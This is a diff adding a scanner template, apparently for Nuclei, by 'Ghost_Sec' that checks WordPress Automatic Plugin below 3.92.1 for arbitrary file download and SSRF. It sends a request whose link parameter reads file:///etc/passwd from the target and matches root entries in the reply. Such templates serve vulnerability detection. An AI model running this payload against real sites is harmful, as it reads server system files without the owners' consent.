@@ -1,0 +1,26 @@
+id: vulnerable
+ # ____ _               _                   
+ #/ ___| |__   ___  ___| |_   ___  ___  ___ 
+#| |  _| '_ \ / _ \/ __| __| / __|/ _ \/ __|
+#| |_| | | | | (_) \__ \ |_  \__ \  __/ (__ 
+ #\____|_| |_|\___/|___/\__| |___/\___|\___|
+info:
+  name: WordPress Automatic Plugin <3.92.1 - Arbitrary File Download and SSRF
+  author: Ghost_Sec
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?p=3232&wp_automatic=download&link=file:///etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"link":"file:'
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
